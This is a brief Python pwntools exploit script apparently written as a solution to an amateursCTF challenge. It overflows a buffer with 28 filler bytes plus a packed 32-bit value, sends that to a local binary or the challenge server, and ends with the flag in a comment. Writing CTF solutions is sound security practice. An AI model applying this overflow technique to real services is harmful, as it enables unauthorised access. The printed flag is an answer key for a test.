#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* main+82

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('amt.rs', 31630)
else:
        p = process(exe.path)

GDB()
payload = b"a" * 28 + p32(0xffffffbe)
sla(b"hex:", payload)
p.interactive()
# amateursCTF{wait_this_wasnt_supposed_to_be_printed_76723}